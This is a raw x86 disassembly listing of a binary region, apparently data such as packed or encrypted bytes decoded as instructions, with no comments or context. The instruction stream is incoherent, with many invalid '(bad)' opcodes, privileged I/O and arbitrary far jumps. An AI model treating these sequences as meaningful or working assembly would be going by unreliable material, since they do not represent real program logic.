  418a02:	add    BYTE PTR [ebx+0x54],ch
  418a05:	lods   eax,DWORD PTR ds:[esi]
  418a06:	cdq    
  418a07:	gs ins BYTE PTR es:[edi],dx
  418a09:	lahf   
  418a0a:	into   
  418a0b:	or     eax,0xec2b9437
  418a10:	pop    edi
  418a11:	pop    edx
  418a12:	ret    
  418a13:	mov    edi,0xd284e7c7
  418a18:	iret   
  418a19:	pop    es
  418a1a:	sbb    al,bl
  418a1c:	mov    ah,0xff
  418a1e:	(bad)  
  418a1f:	out    0x9a,eax
  418a21:	(bad)  
  418a22:	pop    esp
  418a23:	mov    ecx,0xed6b4fc4
  418a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a29:	sbb    DWORD PTR [eax+0x597c79b0],0x9
  418a30:	dec    ebx
  418a31:	mov    dh,0xbe
  418a33:	fadd   DWORD PTR [edi+0x5a04953c]
  418a39:	in     al,dx
  418a3a:	out    0x56,eax
  418a3c:	in     eax,dx
  418a3d:	jo     0x418a4f
  418a3f:	dec    edx
  418a40:	les    esi,FWORD PTR [edi-0x33]
  418a43:	cmc    
  418a44:	add    BYTE PTR [ebp+0x4d98cf34],bh
  418a4a:	mov    edx,0xac76b004
  418a4f:	sbb    eax,0x119967b2
  418a54:	ror    esi,0xca
  418a57:	fidivr WORD PTR [esi]
  418a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a5a:	adc    ebx,DWORD PTR ds:0x5ac3fd35
  418a60:	mov    dh,0xcd
  418a62:	sbb    bl,BYTE PTR [eax+0x44157a4b]
  418a68:	cdq    
  418a69:	(bad)  
  418a6a:	mov    ecx,0xbda88a1c
  418a6f:	push   ds
  418a70:	lock mov eax,0xbcdbc1a4
  418a76:	inc    edx
  418a77:	jmp    0x67638e21
  418a7c:	xor    DWORD PTR [edx],0xefabb2cd
  418a82:	xor    cl,cl
  418a84:	xor    dl,BYTE PTR [edi+esi*8]
  418a87:	jae    0x418a70
  418a89:	sub    DWORD PTR [edi-0x52b85bd],0x4d
  418a90:	inc    eax
  418a91:	dec    eax
  418a92:	push   ebp
  418a93:	jle    0x418a35
  418a95:	or     ebp,ebp
  418a97:	js     0x418af3
  418a99:	(bad)  
  418a9a:	fldenv [edx-0x4f42deb1]
  418aa0:	add    eax,0xd1b3866f
  418aa5:	add    DWORD PTR [ecx],esp
  418aa7:	cmp    ebx,eax
  418aa9:	in     eax,dx
  418aaa:	push   0xffffffd3
  418aac:	shl    DWORD PTR [eax-0x32],1
  418aaf:	mov    bl,0x47
  418ab1:	sub    DWORD PTR [edx-0x77],esi
  418ab4:	inc    esi
	...
  418b15:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b19:	xor    ch,bh
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0x2d0941ce
  418b23:	in     al,0xe3
  418b25:	or     BYTE PTR [edx+0x3],dl
  418b28:	add    DWORD PTR [eax],eax
  418b2a:	pop    es
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    BYTE PTR [edi+0x46a1c051],dl
  418b33:	shr    BYTE PTR [edx+0x2f67ea5],1
  418b39:	dec    edi
  418b3a:	adc    edi,eax
  418b3c:	gs xchg ebx,eax
  418b3f:	call   0x9ba6:0x4e7d52fb
  418b46:	fbstp  TBYTE PTR [ebx]
  418b48:	scas   eax,DWORD PTR es:[edi]
  418b49:	cmp    DWORD PTR [edx],esi
  418b4b:	cmp    BYTE PTR [esp+ebp*8],dh
  418b4e:	pushf  
  418b4f:	shr    BYTE PTR [esp+eax*2+0x48fe2574],0xa7
  418b57:	mov    eax,0x1c611061
  418b5c:	sbb    eax,DWORD PTR [edx-0x2ed94d1b]
  418b62:	test   DWORD PTR [edi-0x3c9f686a],eax
  418b68:	pop    ebx
  418b69:	cmp    dh,BYTE PTR [ecx]
  418b6b:	push   esp
  418b6c:	sti    
  418b6d:	dec    ecx
  418b6e:	sub    bh,BYTE PTR [edi+edi*4]
  418b71:	test   DWORD PTR [eax],esp
  418b73:	loope  0x418b79
  418b75:	int3   
  418b76:	push   es
  418b77:	xor    al,0xd0
  418b79:	ins    BYTE PTR es:[edi],dx
  418b7a:	call   0x49bc:0x60571920
  418b81:	push   esi
  418b82:	fwait
  418b83:	mov    al,ds:0xfcf9ec59
  418b88:	hlt    
  418b89:	addr16 xor eax,0x9d4de1c1
  418b8f:	imul   eax,DWORD PTR [edx+eiz*2+0x64ead20d],0x21
  418b97:	xchg   edx,eax
  418b98:	adc    al,BYTE PTR [edx+0x34]
  418b9b:	xor    BYTE PTR ds:0xf8d81fae,ah
  418ba1:	stc    
  418ba2:	push   ds
  418ba3:	jne    0x418b80
  418ba5:	inc    eax
  418ba6:	jge    0x418be7
  418ba8:	lahf   
  418ba9:	push   es
  418baa:	fmul   DWORD PTR ss:[esi-0x19490877]
  418bb1:	fisttp WORD PTR [eax+0xa5c0406]
  418bb7:	lds    edx,FWORD PTR [ebp-0x3a7ac961]
  418bbd:	out    dx,eax
  418bbe:	xchg   ecx,eax
  418bbf:	shl    DWORD PTR [ecx-0x3a],0xf
  418bc3:	add    bl,BYTE PTR [ebp+0x10]
  418bc6:	add    ah,dl
  418bc8:	popa   
  418bc9:	adc    eax,0x1055285f
  418bce:	adc    DWORD PTR [edx],edx
  418bd0:	dec    ecx
  418bd1:	pop    edi
  418bd2:	jg     0x418c49
  418bd4:	or     al,BYTE PTR [ebx-0x6e]
  418bd7:	pop    eax
  418bd8:	iret   
  418bd9:	inc    edx
  418bda:	xchg   edi,eax
  418bdb:	inc    edx
  418bdc:	mov    ebx,0x35238a33
  418be1:	adc    BYTE PTR [edx+0x6212a20],0x28
  418be8:	pop    ecx
  418be9:	invd   
  418beb:	xchg   edx,eax
  418bec:	lock in al,dx
  418bee:	mov    cl,0xac
  418bf0:	ss shr ebx,0x12
  418bf4:	cmp    dl,al
  418bf6:	ja     0x418c66
  418bf8:	iret   
  418bf9:	cwde   
  418bfa:	fisubr DWORD PTR ds:0x7f216c17
  418c00:	adc    eax,0x5b635491
  418c05:	cmp    ebp,DWORD PTR [ebx-0x10]
  418c08:	pop    edx
  418c09:	dec    ebx
  418c0a:	lods   eax,DWORD PTR ds:[esi]
  418c0b:	add    eax,0x7c35ee7f
  418c10:	and    al,0xc8
  418c12:	loope  0x418c43
  418c14:	outs   dx,BYTE PTR ds:[esi]
  418c15:	fisub  DWORD PTR ds:0xb5cd17d4
  418c1b:	out    0x45,eax
  418c1d:	and    al,0x24
  418c1f:	add    BYTE PTR [eax-0x1d08ab35],dl
  418c25:	cdq    
  418c26:	cld    
  418c27:	popa   
  418c28:	xor    eax,0x9e841018
  418c2d:	cmp    eax,0x3cdbc6bf
  418c32:	loope  0x418c56
  418c34:	xchg   esp,eax
	...
  418c95:	add    bl,bh
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    esp,DWORD PTR [esp+ebx*2-0x3d]
  418ca5:	sti    
  418ca6:	pop    ecx
  418ca7:	add    al,0x1
  418ca9:	add    BYTE PTR [edi],al
  418cab:	add    DWORD PTR [eax],eax
  418cad:	add    BYTE PTR [edi+0x780a3f8b],cl
  418cb3:	clc    
  418cb4:	sbb    bl,BYTE PTR [esi-0x2c]
  418cb7:	stos   BYTE PTR es:[edi],al
  418cb8:	mov    al,ds:0x7f2e37f2
  418cbd:	jge    0x418c57
  418cbf:	fld    TBYTE PTR ds:0x32024165
  418cc5:	out    0x2e,al
  418cc7:	inc    edi
  418cc8:	in     eax,0x8f
  418cca:	popf   
  418ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ccc:	mov    dh,0xc8
  418cce:	test   DWORD PTR [ecx],eax
  418cd0:	aad    0x29
  418cd2:	mov    gs,WORD PTR [ecx-0x7a2c4311]
  418cd8:	mov    al,ds:0xd318e193
  418cdd:	dec    esi
  418cde:	jle    0x418cf4
  418ce0:	frstor ds:[esi+0x20d0f95e]
  418ce7:	clc    
  418ce8:	inc    esp
  418ce9:	fisttp WORD PTR ds:0xd4e0e271
  418cef:	(bad)  
  418cf0:	mov    eax,0xcb8302f3
  418cf5:	sbb    eax,0xe5a6e84b
  418cfa:	imul   DWORD PTR [esi+0x10]
  418cfd:	ds aam 0xd8
  418d00:	push   ss
  418d01:	jmp    0x418cbe
  418d03:	into   
  418d04:	mov    al,0x88
  418d06:	add    DWORD PTR [ebx+0x57],ebp
  418d09:	sbb    DWORD PTR [ebp-0x5f],ecx
  418d0c:	cmp    ebp,DWORD PTR [ebp-0x44]
  418d0f:	xchg   edx,eax
  418d10:	outs   dx,BYTE PTR ds:[esi]
  418d11:	call   0x36ce982f
  418d16:	dec    eax
  418d17:	pop    ebp
  418d18:	ret    0x8519
  418d1b:	xchg   ecx,eax
  418d1c:	sbb    DWORD PTR [edi+eiz*4],esp
  418d1f:	jge    0x418d04
  418d21:	mov    edi,0xe795fb7d
  418d26:	int    0x79
  418d28:	sbb    bl,ch
  418d2a:	repz inc eax
  418d2c:	inc    ebp
  418d2d:	cwde   
  418d2e:	(bad)  
  418d2f:	fdiv   QWORD PTR [ebx+0x2ef45441]
  418d35:	jae    0x418d35
  418d37:	cmp    ah,BYTE PTR [edi-0x17]
  418d3a:	or     al,0x47
  418d3c:	xor    al,0x63
  418d3e:	push   edx
  418d3f:	inc    edx
  418d40:	and    DWORD PTR [ebx+0xe],0x3a695be8
  418d47:	stc    
  418d48:	and    dh,bh
  418d4a:	mov    eax,0xdcfe39f5
  418d4f:	or     DWORD PTR [ebp+0x59d5d7a6],ebx
  418d55:	add    eax,0x8df8810b
  418d5a:	inc    ecx
  418d5b:	mov    ebx,0x8263c88c
  418d60:	mov    edx,0x693c12d
  418d65:	jl     0x418d76
  418d67:	scas   al,BYTE PTR es:[edi]
  418d68:	cmc    
  418d69:	out    0x56,al
  418d6b:	xchg   DWORD PTR [ebp-0x5e],edx
  418d6e:	mov    ds:0x684f58a8,eax
  418d73:	dec    ecx
  418d74:	add    edi,DWORD PTR [edi]
  418d76:	pop    ss
  418d77:	dec    ebx
  418d78:	push   edx
  418d79:	imul   esi,DWORD PTR [eax+eax*4-0x11],0x23
  418d7e:	push   ecx
  418d7f:	add    BYTE PTR [ecx*8-0x71ecf2bb],bl
  418d86:	pop    eax
  418d87:	dec    esi
  418d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d89:	mov    edx,0xa8257570
  418d8e:	adc    DWORD PTR [eax+0x42a8bbe9],esi
  418d94:	sub    eax,0x9ff2c2f5
  418d99:	cmp    eax,0x31b5bcc3
  418d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d9f:	mov    BYTE PTR [ecx-0x75],bh
  418da2:	dec    esp
  418da3:	test   BYTE PTR [ecx],bl
  418da5:	add    ah,bl
  418da7:	mov    bl,0xf7
  418da9:	retf   
  418daa:	ja     0x418dcc
  418dac:	xchg   esi,eax
  418dad:	mov    cl,0xd7
  418daf:	dec    esp
  418db0:	dec    esi
  418db1:	xchg   ebp,eax
  418db2:	add    al,0xda
  418db4:	aad    0x0
	...
  418e16:	push   cs
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0xb18b86ab
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	mov    ebx,DWORD PTR [eax-0x76]
  418e31:	xlat   BYTE PTR ds:[ebx]
  418e32:	mov    edx,0xaf4fda3e
  418e37:	rsm    
  418e39:	shr    DWORD PTR [edi],cl
  418e3b:	(bad)  
  418e3c:	cwde   
  418e3d:	jg     0x418e62
  418e3f:	mov    ch,0xaf
  418e41:	cli    
  418e42:	xchg   esp,eax
  418e43:	xor    eax,0x69a577b7
  418e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e49:	sub    al,BYTE PTR [ebp-0x143863d4]
  418e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e50:	push   eax
  418e51:	inc    edi
  418e52:	ret    
  418e53:	stos   BYTE PTR es:[edi],al
  418e54:	or     BYTE PTR [esi+esi*8-0x4e45088],bl
  418e5b:	ret    
  418e5c:	xchg   ebx,eax
  418e5d:	sbb    eax,0xa1edf807
  418e62:	aam    0xf3
  418e64:	dec    ecx
  418e65:	dec    ebx
  418e66:	adc    al,0x6f
  418e68:	repz push ds
  418e6a:	jle    0x418e50
  418e6c:	sbb    eax,0xad51656b
  418e71:	popf   
  418e72:	push   0xe12999ed
  418e77:	lahf   
  418e78:	push   0xffffffb1
  418e7a:	sar    BYTE PTR [ebx+0x4e],1
  418e7d:	cmc    
  418e7e:	xchg   ah,bl
  418e80:	xor    ah,bl
  418e82:	xchg   BYTE PTR [esi-0x3d],dh
  418e85:	dec    esi
  418e86:	inc    ebx
  418e87:	or     eax,0xa66d78aa
  418e8c:	dec    esp
  418e8d:	and    esi,ebp
  418e8f:	xor    eax,DWORD PTR [eax+0x23]
  418e92:	or     al,0xe1
  418e94:	and    DWORD PTR [ebx+0x3b],edx
  418e97:	sbb    eax,0xa6ae74b8
  418e9c:	leave  
  418e9d:	fistp  QWORD PTR [ebx-0x6b]
  418ea0:	fimul  WORD PTR [eax]
  418ea2:	in     eax,dx
  418ea3:	cli    
  418ea4:	pop    ecx
  418ea5:	xor    dl,al
  418ea7:	popf   
  418ea8:	lock push ebp
  418eaa:	cli    
  418eab:	adc    ebp,ecx
  418ead:	jecxz  0x418f00
  418eaf:	(bad)  
  418eb0:	dec    esi
  418eb1:	mov    ch,0x36
  418eb3:	mov    bh,ch
  418eb5:	stos   DWORD PTR es:[edi],eax
  418eb6:	fs int 0x5
  418eb9:	lods   eax,DWORD PTR cs:[esi]
  418ebb:	jno    0x418e5f
  418ebd:	or     bl,dh
  418ebf:	rol    DWORD PTR [esi],1
  418ec1:	pusha  
  418ec2:	pop    ebx
  418ec3:	outs   dx,BYTE PTR ds:[esi]
  418ec4:	loop   0x418f24
  418ec6:	pop    edx
  418ec7:	addr16 in eax,dx
  418ec9:	cmp    al,0x9f
  418ecb:	xor    eax,0xba9f09cd
  418ed0:	mov    edi,0x2fb48659
  418ed5:	repnz sub ebp,DWORD PTR [esi-0x26]
  418ed9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eda:	icebp  
  418edb:	(bad)  
  418edc:	push   edi
  418edd:	mov    ch,0xef
  418edf:	push   ebx
  418ee1:	loope  0x418ed5
  418ee3:	dec    esi
  418ee4:	data16 daa 
  418ee6:	jg     0x418f59
  418ee8:	rcr    bl,cl
  418eea:	aad    0xd0
  418eec:	push   0xad812d45
  418ef1:	mov    ds:0xbda5cae,al
  418ef6:	ja     0x418f59
  418ef8:	pusha  
  418ef9:	lahf   
  418efa:	jmp    0xe299:0x42cad85a
  418f01:	js     0x418f01
  418f03:	popf   
  418f04:	scas   al,BYTE PTR es:[edi]
  418f05:	aad    0x99
  418f07:	cmc    
  418f08:	stc    
  418f09:	xchg   ecx,eax
  418f0a:	ret    0x967c
  418f0d:	xor    cl,BYTE PTR [ebp-0x19b1b42a]
  418f13:	push   cs
  418f14:	sbb    DWORD PTR [ebx],edx
  418f16:	fwait
  418f17:	adc    al,dh
  418f19:	inc    edi
  418f1a:	loop   0x418e9c
  418f1c:	stos   BYTE PTR es:[edi],al
  418f1d:	fnstenv ds:[eax]
  418f20:	(bad)
  418f23:	jae    0x418f81
  418f25:	xchg   ebp,eax
  418f26:	icebp  
  418f27:	add    ah,BYTE PTR [esi]
  418f29:	sbb    edi,ebx
  418f2b:	movaps xmm3,XMMWORD PTR [esi+0x6900601]
  418f32:	cmp    dl,BYTE PTR [ebx+ebx*2+0x0]
	...
  418f95:	add    BYTE PTR [edi+edx*4],bl
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp+0x297adcb2]
  418fa3:	out    0xbe,eax
  418fa5:	mov    dl,0x67
  418fa7:	push   es
  418fa8:	add    DWORD PTR [eax],eax
  418faa:	pop    es
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    BYTE PTR [edx],dl
  418faf:	sahf   
  418fb0:	sub    al,0xdb
  418fb2:	pop    ss
  418fb3:	or     DWORD PTR [eax],edx
  418fb5:	lock and ch,bh
  418fb8:	mov    ebx,0x6e5aee2c
  418fbd:	lods   al,BYTE PTR ds:[esi]
  418fbe:	(bad)  
  418fbf:	xor    cl,BYTE PTR [edx-0x3eb963a3]
  418fc5:	push   ecx
  418fc6:	sub    esp,eax
  418fc8:	sbb    bh,BYTE PTR [esi+0x141108ba]
  418fce:	call   0x6dd7ab88
  418fd3:	jnp    0x418fbd
  418fd5:	sub    al,0xdb
  418fd7:	lahf   
  418fd8:	loop   0x418f82
  418fda:	or     BYTE PTR [edx],dl
  418fdc:	add    al,0x30
  418fde:	or     ah,BYTE PTR [ebp-0x15a7af32]
  418fe4:	ins    BYTE PTR es:[edi],dx
  418fe5:	xchg   ecx,eax
  418fe6:	push   ss
  418fe7:	data16 jae 0x41903b
  418fea:	jb     0x419064
  418fec:	(bad)  
  418fed:	loopne 0x418f8d
  418fef:	lods   eax,DWORD PTR ds:[esi]
  418ff0:	ret    0x3d99
  418ff3:	jb     0x419064
  418ff5:	(bad)  
  418ff6:	and    eax,0x3e7599de
  418ffb:	cwde   
  418ffc:	dec    esp
  418ffd:	and    eax,0x87f8cd57
  419002:	mov    cl,0x6c
  419004:	push   eax
  419005:	xor    eax,0x71ed6987
  41900a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41900b:	in     al,0x89
  41900d:	push   ebx
  41900e:	xor    cl,BYTE PTR [esi]
  419010:	jl     0x419030
  419012:	scas   eax,DWORD PTR es:[edi]
  419013:	imul   ebx,DWORD PTR [esi+0x1481f509],0xa5d0f86b
  41901d:	cdq    
  41901e:	fsubr  QWORD PTR ds:0xf3420ac8
  419024:	repnz mov ecx,0xec8a4891
  41902a:	jecxz  0x4190a9
  41902c:	mov    edx,0x722b41dd
  419031:	fwait
  419032:	xchg   ecx,eax
  419033:	call   0x53ef:0x44d4e3ce
  41903a:	(bad)
  41903d:	pop    edi
  41903e:	aaa    
  41903f:	push   ss
  419040:	nop
  419041:	int3   
  419042:	adc    ebx,DWORD PTR [ecx+0x1f]
  419045:	stos   BYTE PTR es:[edi],al
  419046:	push   edi
  419047:	or     ebx,DWORD PTR [eax-0x64]
  41904a:	das    
  41904b:	pop    eax
  41904c:	rcl    DWORD PTR [ebp-0x70],1
  41904f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419050:	sub    al,0xdf
  419052:	neg    esi
  419054:	cmp    DWORD PTR [ecx-0x47],ecx
  419057:	mov    ds:0x5825c925,eax
  41905c:	clc    
  41905d:	mov    ebx,DWORD PTR [ebx+0x1e]
  419060:	add    edx,ebp
  419062:	and    eax,0xd1498047
  419067:	imul   esp,eax,0x89a6700b
  41906d:	xor    al,dl
  41906f:	xchg   edi,eax
  419070:	int    0x23
  419072:	jmp    0xb29f563
  419077:	retf   
  419078:	mov    DWORD PTR ds:0xcf49667b,ecx
  41907e:	out    dx,al
  41907f:	pop    ebx
  419080:	in     al,0x82
  419082:	cli    
  419083:	xchg   ecx,eax
  419084:	shr    DWORD PTR [esi-0x3d43437f],cl
  41908a:	call   FWORD PTR [esi-0x690b5e02]
  419090:	(bad)  
  419091:	push   ecx
  419092:	shl    DWORD PTR [esi+0x98b72bf],1
  419098:	retf   0x432f
  41909b:	(bad)
  41909e:	inc    esp
  41909f:	pop    ebp
  4190a0:	push   esp
  4190a1:	aad    0x94
  4190a3:	nop
  4190a4:	call   0x4fca2983
  4190a9:	cmp    eax,0xc3340e25
  4190ae:	mov    dh,0x52
  4190b0:	out    dx,eax
  4190b1:	jge    0x419063
  4190b3:	test   ebp,ebx
	...
  419115:	add    BYTE PTR [edi-0x41bd617b],ch
  41911b:	pop    ebx
  41911c:	(bad)  
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    edx,DWORD PTR [edx-0x76]
  419124:	mov    ebp,0x1076ee4
  419129:	add    BYTE PTR [edi],al
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    BYTE PTR [edi-0x51fb1e41],cl
  419133:	or     bh,bl
  419135:	int3   
  419136:	push   cs
  419137:	cmp    al,0xdd
  419139:	add    eax,0xd9f054bb
  41913e:	popa   
  41913f:	jo     0x4190cc
  419141:	or     al,0xf2
  419143:	std    
  419144:	loop   0x4191c3
  419146:	push   ds
  419147:	in     al,0xf9
  419149:	(bad)  
  41914a:	(bad)  
  41914b:	sbb    esi,ecx
  41914d:	sbb    eax,0x24ff4e07
  419152:	pop    ebp
  419153:	(bad)  
  419154:	in     eax,dx
  419155:	push   edx
  419156:	sbb    al,0x1a
  419158:	dec    ebp
  419159:	push   esi
  41915a:	out    dx,al
  41915b:	loop   0x4190fc
  41915d:	add    cl,bh
  41915f:	test   BYTE PTR [ebp-0x60],al
  419162:	jmp    0x419111
  419164:	stc    
  419165:	sbb    eax,0xb4d272d3
  41916a:	mov    bl,0xf2
  41916c:	fisub  WORD PTR [edi-0x4d60c44d]
  419172:	sub    al,0x89
  419174:	dec    esi
  419175:	mov    esi,0x13f62872
  41917a:	sti    
  41917b:	push   cs
  41917c:	int    0xa9
  41917e:	jb     0x4191b3
  419180:	cwde   
  419181:	pop    es
  419182:	cdq    
  419183:	mov    al,0x14
  419185:	add    ch,BYTE PTR [edi-0x2]
  419188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419189:	sub    ebp,ecx
  41918b:	js     0x419189
  41918d:	sbb    BYTE PTR [ecx-0x53fcd448],ah
  419193:	js     0x41913b
  419195:	popf   
  419196:	enter  0x877e,0xe
  41919a:	jecxz  0x4191da
  41919c:	push   ss
  41919d:	dec    ebx
  41919e:	(bad)  
  41919f:	fistp  DWORD PTR [ecx-0x27]
  4191a2:	xchg   ecx,eax
  4191a3:	ret    
  4191a4:	or     al,0x22
  4191a6:	push   0x65
  4191a8:	xlat   BYTE PTR ds:[ebx]
  4191a9:	sbb    esp,edi
  4191ab:	or     ecx,edi
  4191ad:	cmp    ebx,edi
  4191af:	pop    esi
  4191b0:	loopne 0x4191d8
  4191b2:	cwde   
  4191b3:	mov    dh,0x0
  4191b5:	adc    al,0xd0
  4191b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b8:	pop    ebp
  4191b9:	jmp    0x419146
  4191bb:	fld    TBYTE PTR [edx+0x1f]
  4191be:	adc    eax,0x2ab6d48b
  4191c3:	(bad)  
  4191c4:	aas    
  4191c5:	xchg   edx,eax
  4191c6:	adc    BYTE PTR [ebx-0x60f7f5ba],bl
  4191cc:	out    0x9f,eax
  4191ce:	fsub   st(7),st
  4191d0:	ror    DWORD PTR [ebx+0x6e6ff71],cl
  4191d6:	sbb    BYTE PTR [ecx-0x57],bh
  4191d9:	adc    ebx,ebx
  4191db:	in     al,dx
  4191dc:	dec    edx
  4191dd:	(bad)  
  4191de:	call   0x5634ff5a
  4191e3:	js     0x419264
  4191e5:	mov    al,ds:0x9959e0f5
  4191ea:	(bad)  
  4191eb:	dec    ebx
  4191ec:	popa   
  4191ed:	fsubr  QWORD PTR [ebp-0x3723a34c]
  4191f3:	out    dx,eax
  4191f4:	adc    BYTE PTR ds:0xaaa536b9,bl
  4191fa:	sub    al,0x75
  4191fc:	shl    edi,0x78
  4191ff:	jmp    0xa6e9:0x62975ad3
  419206:	push   esp
  419207:	sub    BYTE PTR [ecx],ch
  419209:	pop    eax
  41920a:	or     BYTE PTR [eax+0x548d25cd],bl
  419210:	jle    0x41925b
  419212:	sahf   
  419213:	inc    ebx
  419214:	lods   al,BYTE PTR ds:[esi]
  419215:	or     eax,0x275681d5
  41921a:	out    0xe,al
  41921c:	jb     0x41926b
  41921e:	mov    ecx,0x60e05264
  419223:	or     al,0xe1
  419225:	test   dh,0x2a
  419228:	pop    esp
  419229:	ja     0x419252
  41922b:	(bad)  
  41922d:	push   cs
  41922e:	in     al,dx
  41922f:	pop    eax
  419230:	adc    bl,BYTE PTR [edx+edx*1-0x62]
  419234:	dec    ebp
	...
  419295:	add    BYTE PTR [eax-0xcc4519],ah
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0x8211214f
  4192a5:	cld    
  4192a6:	jne    0x4192b0
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [esi-0x64],ch
  4192b0:	jp     0x4192a0
  4192b2:	out    0x84,al
  4192b4:	add    BYTE PTR [ebx-0xb],bl
  4192b7:	pop    esp
  4192b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192b9:	jmp    0x4da:0xe1c4ed07
  4192c0:	sar    BYTE PTR [eax-0x25370c51],0x89
  4192c7:	mov    edi,DWORD PTR [edx]
  4192c9:	adc    al,ch
  4192cb:	ss adc al,0x96
  4192ce:	adc    dh,BYTE PTR [ebp-0x53de7b1e]
  4192d4:	pop    edx
  4192d5:	fcmovbe st,st(3)
  4192d7:	mov    bl,0x31
  4192d9:	or     esi,DWORD PTR [esi+edi*8-0x28]
  4192dd:	xchg   ebp,eax
  4192de:	adc    DWORD PTR [edx-0x1c],esp
  4192e1:	adc    DWORD PTR [ebx],edx
  4192e3:	nop
  4192e4:	mov    eax,ds:0x8be77c77
  4192e9:	data16 jge 0x4192f6
  4192ec:	ficomp WORD PTR [ecx]
  4192ee:	neg    BYTE PTR ds:0xce82272a
  4192f4:	shl    BYTE PTR ds:[ecx+0x3de7f5be],0x66
  4192fc:	push   es
  4192fd:	shl    DWORD PTR [edi],cl
  4192ff:	retf   
  419300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419301:	ret    0x3337
  419304:	dec    BYTE PTR ds:0xad18a570
  41930a:	cmp    ecx,ebp
  41930c:	(bad)  
  41930d:	(bad)  [edi+ecx*2+0x70]
  419311:	mov    ch,0x56
  419313:	jns    0x4192ef
  419315:	xor    DWORD PTR [esi+ebx*4],edi
  419318:	mov    al,ds:0x232055e7
  41931d:	push   ds
  41931e:	mov    eax,0xc6ffc224
  419323:	mov    eax,0xb69f42a4
  419328:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41932a:	repz lea esp,[ebx+0x2d]
  41932e:	dec    ebp
  41932f:	fbld   TBYTE PTR [ecx-0x14e5af2a]
  419335:	pusha  
  419336:	fcmovnu st,st(3)
  419338:	cmp    eax,0x13cf308b
  41933d:	and    dl,0xa0
  419340:	or     BYTE PTR [ecx],dh
  419342:	aam    0x39
  419344:	and    bh,BYTE PTR [ebp+0x5d]
  419347:	ret    
  419348:	int3   
  419349:	loope  0x419342
  41934b:	xor    ecx,DWORD PTR [ecx+0x4257d383]
  419351:	pop    esp
  419352:	jmp    0x41933a
  419354:	push   ebp
  419355:	or     BYTE PTR [edi+0x4e199228],dl
  41935b:	iret   
  41935c:	or     edx,DWORD PTR [edi+eax*8-0x3dc793e1]
  419363:	sub    esi,0x7e4a14b2
  419369:	mov    bh,0xa7
  41936b:	xlat   BYTE PTR ds:[ebx]
  41936c:	int    0xeb
  41936e:	add    DWORD PTR [ecx-0x24],ebx
  419371:	es mov ebx,0xfc40e32c
  419377:	stos   DWORD PTR es:[edi],eax
  419378:	fsubrp st(3),st
  41937a:	xor    ebp,edx
  41937c:	xchg   esp,eax
  41937d:	push   esi
  41937e:	xor    BYTE PTR [ebx],ah
  419380:	jg     0x419352
  419382:	jne    0x41939b
  419384:	aas    
  419385:	popa   
  419386:	stos   DWORD PTR es:[edi],eax
  419387:	mov    dl,0x5c
  419389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41938a:	xor    al,0xe3
  41938c:	push   edi
  41938d:	scas   al,BYTE PTR es:[edi]
  41938e:	xchg   edi,eax
  41938f:	test   al,0x6f
  419391:	sbb    eax,0xeeded0bf
  419396:	sub    esp,DWORD PTR [eax+0x75]
  419399:	push   ebx
  41939a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41939b:	jbe    0x41938f
  41939d:	lea    ebx,[edx-0x6d5f5e0e]
  4193a3:	mov    bh,0x6
  4193a5:	lahf   
  4193a6:	adc    BYTE PTR [edi],bl
  4193a8:	and    eax,0xde88d163
  4193ad:	sub    eax,0x20f1a989
  4193b2:	ss xchg ebp,eax
  4193b4:	cdq    
	...
  419415:	add    BYTE PTR ds:0xed3a6998,bh
  41941b:	sti    
  41941c:	jg     0x4193bd
  41941e:	les    ecx,FWORD PTR [ebp+ebp*8-0x6fa2dbc9]
  419425:	xchg   esi,eax
  419426:	jl     0x419431
  419428:	add    DWORD PTR [eax],eax
  41942a:	pop    es
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    ah,ch
  41942f:	aad    0x39
  419431:	out    0x75,al
  419433:	xor    bl,BYTE PTR [edi+0x5d]
  419436:	xchg   ecx,eax
  419437:	dec    edx
  419438:	cmp    al,0x3e
  41943a:	push   esi
  41943b:	and    al,0x85
  41943d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41943e:	lahf   
  41943f:	cmp    BYTE PTR [esi],0x31
  419442:	inc    ebx
  419443:	add    al,0x11
  419445:	dec    esp
  419446:	mov    bl,0x9b
  419448:	pop    ecx
  419449:	xchg   ecx,eax
